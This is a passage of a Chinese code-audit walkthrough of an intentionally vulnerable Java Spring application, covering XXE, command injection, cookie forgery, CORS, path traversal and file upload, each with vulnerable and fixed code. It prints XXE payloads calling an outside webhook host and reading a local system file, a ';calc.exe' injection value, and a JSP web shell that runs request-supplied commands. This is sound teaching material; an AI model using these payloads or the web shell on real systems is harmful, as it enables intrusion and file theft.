<p>修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY，不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</p>
<h3 id="上述存在XXE漏洞库对比"><a href="#上述存在XXE漏洞库对比" class="headerlink" title="上述存在XXE漏洞库对比"></a>上述存在XXE漏洞库对比</h3><table>
<thead>
<tr>
<th><strong>工具&#x2F;类</strong></th>
<th><strong>简介</strong></th>
<th><strong>使用场景</strong></th>
<th><strong>优点</strong></th>
<th><strong>缺点</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>xmlReader</code></td>
<td>SAX 的接口，基于事件驱动的解析</td>
<td>处理大型 XML 文件</td>
<td>内存占用小，速度快</td>
<td>需要手动管理上下文，处理复杂结构困</td>
</tr>
<tr>
<td><code>SAXBuilder</code></td>
<td>JDOM 中基于 SAX 的解析器</td>
<td>需要用 JDOM 处理 XML 数据时</td>
<td>结合了 SAX 的高效性和 JDOM 的易用性</td>
<td>解析速度依赖于 SAX，灵活性低于 DOM</td>
</tr>
<tr>
<td>SAXReader&#96;</td>
<td>Dom4j 中基于 SAX 的解析器</td>
<td>需要 Dom4j 进行 XML 操作时</td>
<td>高效且灵活，支持树结构</td>
<td>性能略逊于纯 SAX</td>
</tr>
<tr>
<td><code>SAXParser</code></td>
<td>Java 中的 SAX 解析器</td>
<td>基于事件驱动的解析，适合处理大型 XML 文件</td>
<td>高效，内存占用小</td>
<td>解析复杂 XML 需要手动处理回调</td>
</tr>
<tr>
<td>Digester&#96;</td>
<td>基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）</td>
<td>需要将 XML 映射为 Java 对象时</td>
<td>简化 XML 与 Java 对象的映射</td>
<td>对大文件不友好，灵活性较低</td>
</tr>
<tr>
<td>DocumentBuilder&#96;</td>
<td>Java 中 DOM 解析器，用于构建树状结构</td>
<td>需要完整树结构操作，如修改和多次遍历 XML 文件</td>
<td>完整保留文档结构，易于查找和修改</td>
<td>内存占用较大，处理大文件时性能较差</td>
</tr>
<tr>
<td><code>DocumentHelper</code></td>
<td>Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td>
<td>需要手动构建和操作 XML 文档时</td>
<td>快速创建和处理 XML 文档，灵活性高</td>
<td>内存占用较大，处理超大文件时性能不佳</td>
</tr>
</tbody></table>
<h4 id="统一漏洞利用payload："><a href="#统一漏洞利用payload：" class="headerlink" title="统一漏洞利用payload："></a>统一漏洞利用payload：</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
</code></pre>
<p>POST传入：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008105859368.png" alt="image-20241008105859368"></p>
<p>接收到DNSLOG</p>
<p><img src="C:\Users\ttycp3\AppData\Roaming\Typora\typora-user-images\image-20241008105829498.png" alt="image-20241008105829498"></p>
<h4 id="统一修复代码"><a href="#统一修复代码" class="headerlink" title="统一修复代码"></a>统一修复代码</h4><pre><code class="java">//实例化解析类之后通常会支持着三个配置
obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
</code></pre>
<p>禁用了外部实体，限制实体来源。</p>
<h3 id="10-路由-x2F-xxe-x2F-xmlbeam-x2F-vuln"><a href="#10-路由-x2F-xxe-x2F-xmlbeam-x2F-vuln" class="headerlink" title="10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="Java">        @PostMapping(value = &quot;/xmlbeam/vuln&quot;)
        HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;
            try &#123;
                logger.info(user.toString());
                return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));
            &#125;catch (Exception e)&#123;
                e.printStackTrace();
                return ResponseEntity.ok(&quot;error&quot;);
            &#125;
        &#125;

        /**
         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
         */
        @ProjectedPayload
        public interface UserPayload &#123;
            @XBRead(&quot;//userName&quot;)
            String getUserName();
        &#125;
</code></pre>
<p>该代码需要使用固定的标签可以实现回显，我们可以构造payload：</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [  
    &lt;!ENTITY xxe SYSTEM &quot;file:/c:/Windows/win.ini&quot;&gt;  
]&gt;
&lt;userPayload&gt;
    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;
&lt;/userPayload&gt;
</code></pre>
<p>通过抓包上传实现任意文件读取</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008142315473.png" alt="image-20241008142315473"></p>
<h3 id="11-路由-x2F-ooxml-x2F-readxlsx"><a href="#11-路由-x2F-ooxml-x2F-readxlsx" class="headerlink" title="11.路由&#x2F;ooxml&#x2F;readxlsx"></a>11.路由&#x2F;ooxml&#x2F;readxlsx</h3><p>漏洞代码：</p>
<pre><code class="Java"> @PostMapping(&quot;/readxlsx&quot;)
    @ResponseBody
    public String ooxml_xxe(MultipartFile file) throws IOException &#123;
        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln

        XSSFSheet sheet = wb.getSheetAt(0);
        XSSFRow row;
        XSSFCell cell;

        Iterator rows = sheet.rowIterator();
        StringBuilder sbResult = new StringBuilder();

        while (rows.hasNext()) &#123;

            row = (XSSFRow) rows.next();
            Iterator cells = row.cellIterator();

            while (cells.hasNext()) &#123;
                cell = (XSSFCell) cells.next();

                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;
                    sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);
                &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;
                    sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);
                &#125; else &#123;
                    logger.info(&quot;errors&quot;);
                &#125;
            &#125;
        &#125;

        return sbResult.toString();
    &#125;
</code></pre>
<p>查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009104055332.png" alt="image-20241009104055332"></p>
<p>用压缩程序打开生成的测试xlsx表格，在[Content_Types].xml文件中插入攻击代码：</p>
<pre><code class="xml-dtd">&lt;!DOCTYPE test [
    &lt;!ELEMENT foo ANY&gt;
    &lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/423855a2-9152-4556-b8d3-a0450e32819c&quot;&gt;
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110131500.png" alt="image-20241009110131500"></p>
<p>然后压缩为1.zip,改后缀为1.xlsx,上传后实现命令执行</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110238586.png" alt="image-20241009110238586"></p>
<h3 id="12-路由-x2F-xlsx-streamer-x2F-readxlsx"><a href="#12-路由-x2F-xlsx-streamer-x2F-readxlsx" class="headerlink" title="12.路由&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</h3><p>漏洞代码：</p>
<pre><code class="java"> @PostMapping(&quot;/readxlsx&quot;)
    public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;
        StreamingReader.builder().open(file.getInputStream());
    &#125;
</code></pre>
<p>换了个库，原理payload 同上</p>
<h2 id="八、命令注入"><a href="#八、命令注入" class="headerlink" title="八、命令注入"></a>八、命令注入</h2><h3 id="1-路由-x2F-codeinject"><a href="#1-路由-x2F-codeinject" class="headerlink" title="1.路由&#x2F;codeinject"></a>1.路由&#x2F;codeinject</h3><p>漏洞代码：</p>
<pre><code class="java">    @GetMapping(&quot;/codeinject&quot;)
    public String codeInject(String filepath) throws IOException &#123;

        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>传入的filepath参数直接与原命令拼接，可以实现命令注入，构造payload：</p>
<pre><code>;calc.exe
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144233099.png" alt="image-20241008144233099"></p>
<h3 id="2-路由-x2F-codeinject-x2F-host"><a href="#2-路由-x2F-codeinject-x2F-host" class="headerlink" title="2.路由&#x2F;codeinject&#x2F;host"></a>2.路由&#x2F;codeinject&#x2F;host</h3><p>漏洞代码：</p>
<pre><code class="Java">@GetMapping(&quot;/codeinject/host&quot;)
    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;

        String host = request.getHeader(&quot;host&quot;);
        logger.info(host);
        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>同样可以实现命令拼接，构造payload：</p>
<pre><code>;calc.exe
</code></pre>
<p>修改host字段实现命令拼接</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144612745.png" alt="image-20241008144612745"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复代码</p>
<pre><code class="java">    @GetMapping(&quot;/codeinject/sec&quot;)
    public String codeInjectSec(String filepath) throws IOException &#123;
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) &#123;
            return &quot;Bad boy. I got u.&quot;;
        &#125;
        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>cmdFilter函数代码：</p>
<pre><code class="Java">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
   public static String cmdFilter(String input) &#123;
        if (!FILTER_PATTERN.matcher(input).matches()) &#123;
            return null;
        &#125;

        return input;
    &#125;
</code></pre>
<p>限制了参数中的字符，防止命令注入。</p>
<h2 id="九、Cookie伪造"><a href="#九、Cookie伪造" class="headerlink" title="九、Cookie伪造"></a>九、Cookie伪造</h2><h3 id="1-路由-x2F-cookie-x2F-vuln01"><a href="#1-路由-x2F-cookie-x2F-vuln01" class="headerlink" title="1.路由&#x2F;cookie&#x2F;vuln01"></a>1.路由&#x2F;cookie&#x2F;vuln01</h3><p>漏洞代码：</p>
<pre><code class="java">    private static String NICK = &quot;nick&quot;;

    @GetMapping(value = &quot;/vuln01&quot;)
    public String vuln01(HttpServletRequest req) &#123;
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="2-路由-x2F-cookie-x2F-vuln02"><a href="#2-路由-x2F-cookie-x2F-vuln02" class="headerlink" title="2.路由&#x2F;cookie&#x2F;vuln02"></a>2.路由&#x2F;cookie&#x2F;vuln02</h3><p>漏洞代码：</p>
<pre><code class="Java"> @GetMapping(value = &quot;/vuln02&quot;)
    public String vuln02(HttpServletRequest req) &#123;
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) &#123;
            nick = getCookie(req, NICK).getValue();  // key code
        &#125;

        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="3-路由-x2F-cookie-x2F-vuln03"><a href="#3-路由-x2F-cookie-x2F-vuln03" class="headerlink" title="3.路由&#x2F;cookie&#x2F;vuln03"></a>3.路由&#x2F;cookie&#x2F;vuln03</h3><p>漏洞代码：</p>
<pre><code class="Java">   @GetMapping(value = &quot;/vuln03&quot;)
    public String vuln03(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) &#123;
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="4-路由-x2F-cookie-x2F-vuln04"><a href="#4-路由-x2F-cookie-x2F-vuln04" class="headerlink" title="4.路由&#x2F;cookie&#x2F;vuln04"></a>4.路由&#x2F;cookie&#x2F;vuln04</h3><p>漏洞代码：</p>
<pre><code class="Java">@GetMapping(value = &quot;/vuln04&quot;)
    public String vuln04(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="5-路由-x2F-cookie-x2F-vuln05"><a href="#5-路由-x2F-cookie-x2F-vuln05" class="headerlink" title="5.路由&#x2F;cookie&#x2F;vuln05"></a>5.路由&#x2F;cookie&#x2F;vuln05</h3><p>漏洞代码：</p>
<pre><code class="Java">   @GetMapping(value = &quot;/vuln05&quot;)
    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="6-路由-x2F-cookie-x2F-vuln06"><a href="#6-路由-x2F-cookie-x2F-vuln06" class="headerlink" title="6.路由&#x2F;cookie&#x2F;vuln06"></a>6.路由&#x2F;cookie&#x2F;vuln06</h3><p>漏洞代码:</p>
<pre><code>@GetMapping(value = &quot;/vuln06&quot;)
    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008145950138.png" alt="image-20241008145950138"></p>
<h2 id="十、CORS"><a href="#十、CORS" class="headerlink" title="十、CORS"></a>十、CORS</h2><p>CORS（跨域资源共享）是用来实现跨域资源访问的，比如有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。</p>
<h3 id="1-路由-x2F-cors-x2F-vuln-x2F-origin"><a href="#1-路由-x2F-cors-x2F-vuln-x2F-origin" class="headerlink" title="1.路由&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</h3><p>漏洞代码：</p>
<pre><code class="java">    private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;

    @GetMapping(&quot;/vuln/origin&quot;)
    public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
        String origin = request.getHeader(&quot;origin&quot;);
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
        return info;
    &#125;
</code></pre>
<h3 id="2-路由-x2F-cors-x2F-vuln-x2F-setHeader"><a href="#2-路由-x2F-cors-x2F-vuln-x2F-setHeader" class="headerlink" title="2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</h3><p>漏洞代码：</p>
<pre><code class="java">@GetMapping(&quot;/vuln/setHeader&quot;)
    public String vuls2(HttpServletResponse response) &#123;
        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
        return info;
    &#125;
</code></pre>
<h3 id="3-路由-x2F-cors-x2F-vuln-x2F-crossOrigin"><a href="#3-路由-x2F-cors-x2F-vuln-x2F-crossOrigin" class="headerlink" title="3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h3><p>漏洞代码：</p>
<pre><code class="Java">    @GetMapping(&quot;*&quot;)
    @RequestMapping(&quot;/vuln/crossOrigin&quot;)
    public String vuls3() &#123;
        return info;
    &#125;
</code></pre>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>可通过抓包修改origin字段验证漏洞</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008155935546.png" alt="image-20241008155935546"></p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><h4 id="（1）限制origin"><a href="#（1）限制origin" class="headerlink" title="（1）限制origin"></a>（1）限制origin</h4><p>防御代码：</p>
<pre><code class="Java">  @CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)
    @GetMapping(&quot;/sec/crossOrigin&quot;)
    public String secCrossOrigin() &#123;
        return info;
    &#125;
</code></pre>
<h4 id="（2）WebMvcConfigurer设置Cors"><a href="#（2）WebMvcConfigurer设置Cors" class="headerlink" title="（2）WebMvcConfigurer设置Cors"></a>（2）WebMvcConfigurer设置Cors</h4><p>防御代码：</p>
<pre><code class="Java">  @GetMapping(&quot;/sec/webMvcConfigurer&quot;)
    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>对应过滤器：</p>
<pre><code class="Java">    public WebMvcConfigurer corsConfigurer() &#123;
        return new WebMvcConfigurerAdapter() &#123;
            @Override
            public void addCorsMappings(CorsRegistry registry) &#123;
                // 为了支持一级域名，重写了checkOrigin
                //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;
                registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**表示所有路由path
                        //.allowedOrigins(allowOrigins)
                        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)
                        .allowCredentials(true);
            &#125;
        &#125;;
    &#125;
</code></pre>
<h4 id="（3）spring-security设置cors"><a href="#（3）spring-security设置cors" class="headerlink" title="（3）spring security设置cors"></a>（3）spring security设置cors</h4><p>防御代码：</p>
<pre><code class="Java">@GetMapping(&quot;/sec/httpCors&quot;)
public CsrfToken getCsrfToken_02(CsrfToken token) &#123;
    return token;
&#125;
</code></pre>
<p>对应过滤器：</p>
<pre><code class="java">    CorsConfigurationSource corsConfigurationSource()
    &#123;
        // Set cors origin white list
        ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();
        allowOrigins.add(&quot;joychou.org&quot;);
        allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。

        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(allowOrigins);
        configuration.setAllowCredentials(true);
        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style
        return source;
    &#125;
</code></pre>
<h4 id="（4）自定义filter设置cors"><a href="#（4）自定义filter设置cors" class="headerlink" title="（4）自定义filter设置cors"></a>（4）自定义filter设置cors</h4><p>防御代码：</p>
<pre><code class="Java">    @GetMapping(&quot;/sec/originFilter&quot;)
    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>对应过滤器：</p>
<pre><code class="Java">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)
public class OriginFilter implements Filter &#123;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException &#123;

    &#125;

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
            throws IOException, ServletException &#123;

        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        String origin = request.getHeader(&quot;Origin&quot;);
        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());

        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑
        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +
                    &quot;\tCurrent url:&quot; + request.getRequestURL());
            response.setStatus(response.SC_FORBIDDEN);
            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);
            return;
        &#125;

        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);

        filterChain.doFilter(req, res);
    &#125;
</code></pre>
<h4 id="（5）CorsFilter设置cors"><a href="#（5）CorsFilter设置cors" class="headerlink" title="（5）CorsFilter设置cors"></a>（5）CorsFilter设置cors</h4><p>防御代码：</p>
<pre><code class="Java"> @RequestMapping(&quot;/sec/corsFilter&quot;)
    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>对应过滤器：</p>
<pre><code class="Java">public class BaseCorsFilter extends CorsFilter &#123;

    public BaseCorsFilter() &#123;
        super(configurationSource());
    &#125;

    private static UrlBasedCorsConfigurationSource configurationSource() &#123;
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持
        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);
        config.addAllowedHeader(&quot;*&quot;);
        config.addAllowedMethod(&quot;GET&quot;);
        config.addAllowedMethod(&quot;POST&quot;);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);

        return source;
    &#125;
&#125;
</code></pre>
<h4 id="（6）origin检查"><a href="#（6）origin检查" class="headerlink" title="（6）origin检查"></a>（6）origin检查</h4><p>防御代码：</p>
<pre><code class="Java">    @GetMapping(&quot;/sec/checkOrigin&quot;)
    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;
        String origin = request.getHeader(&quot;Origin&quot;);

        // 如果origin不为空并且origin不在白名单内，认定为不安全。
        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
            return &quot;Origin is not safe.&quot;;
        &#125;
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
        return LoginUtils.getUserInfo2JsonStr(request);
    &#125;
</code></pre>
<h2 id="十一、目录遍历"><a href="#十一、目录遍历" class="headerlink" title="十一、目录遍历"></a>十一、目录遍历</h2><h3 id="1-路由-x2F-path-traversal-x2F-vul"><a href="#1-路由-x2F-path-traversal-x2F-vul" class="headerlink" title="1.路由&#x2F;path_traversal&#x2F;vul"></a>1.路由&#x2F;path_traversal&#x2F;vul</h3><p>漏洞代码：</p>
<pre><code class="Java">  @GetMapping(&quot;/path_traversal/vul&quot;)
    public String getImage(String filepath) throws IOException &#123;
        return getImgBase64(filepath);
    &#125;
private String getImgBase64(String imgFile) throws IOException &#123;

        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));
        logger.info(&quot;File path: &quot; + imgFile);

        File f = new File(imgFile);
        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        &#125; else &#123;
            return &quot;File doesn&#39;t exist or is not a file.&quot;;
        &#125;
    &#125;
</code></pre>
<p>存在一个文件读取接口，构造目录遍历拿到base64数据</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163207205.png" alt="image-20241008163207205"></p>
<p>解码拿到内容：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163241485.png" alt="image-20241008163241485"></p>
<p>修复代码：</p>
<pre><code class="Java">    @GetMapping(&quot;/path_traversal/sec&quot;)
    public String getImageSec(String filepath) throws IOException &#123;
        if (SecurityUtil.pathFilter(filepath) == null) &#123;
            logger.info(&quot;Illegal file path: &quot; + filepath);
            return &quot;Bad boy. Illegal file path.&quot;;
        &#125;
        return getImgBase64(filepath);
    &#125;
</code></pre>
<p>pathFilter函数内容：</p>
<pre><code class="Java"> public static String pathFilter(String filepath) &#123;
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf(&#39;%&#39;) != -1) &#123;
            try &#123;
                temp = URLDecoder.decode(temp, &quot;utf-8&quot;);
            &#125; catch (UnsupportedEncodingException e) &#123;
                logger.info(&quot;Unsupported encoding exception: &quot; + filepath);
                return null;
            &#125; catch (Exception e) &#123;
                logger.info(e.toString());
                return null;
            &#125;
        &#125;

        if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#39;/&#39;) &#123;
            return null;
        &#125;

        return filepath;
    &#125;
</code></pre>
<p>对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为&#x2F;字符或者存在..连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。</p>
<h2 id="十二、文件上传"><a href="#十二、文件上传" class="headerlink" title="十二、文件上传"></a>十二、文件上传</h2><h3 id="1-路由-x2F-file-x2F-upload"><a href="#1-路由-x2F-file-x2F-upload" class="headerlink" title="1.路由&#x2F;file&#x2F;upload"></a>1.路由&#x2F;file&#x2F;upload</h3><pre><code class="java">    @PostMapping(&quot;/upload&quot;)
    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,
                                   RedirectAttributes redirectAttributes) &#123;
        if (file.isEmpty()) &#123;
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);
            return &quot;redirect:/file/status&quot;;
        &#125;

        try &#123;
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute(&quot;message&quot;,
                    &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);

        &#125; catch (IOException e) &#123;
            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);
            logger.error(e.toString());
        &#125;

        return &quot;redirect:/file/status&quot;;
    &#125;
</code></pre>
<p>文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：</p>
<pre><code class="jsp">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008181225763.png" alt="image-20241008181225763"></p>
<p>修复代码：</p>
<pre><code class="Java">    @PostMapping(&quot;/upload/picture&quot;)
    @ResponseBody
    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;
        if (multifile.isEmpty()) &#123;
            return &quot;Please select a file to upload&quot;;
        &#125;

        String fileName = multifile.getOriginalFilename();
        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名
        String mimeType = multifile.getContentType(); // 获取MIME类型
        String filePath = UPLOADED_FOLDER + fileName;
        File excelFile = convert(multifile);


        // 判断文件后缀名是否在白名单内  校验1
        String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) &#123;
            if (Suffix.toLowerCase().equals(white_suffix)) &#123;
                suffixFlag = true;
                break;
            &#125;
        &#125;
        if (!suffixFlag) &#123;
            logger.error(&quot;[-] Suffix error: &quot; + Suffix);
            deleteFile(filePath);
            return &quot;Upload failed. Illeagl picture.&quot;;
        &#125;


        // 判断MIME类型是否在黑名单内 校验2
        String[] mimeTypeBlackList = &#123;
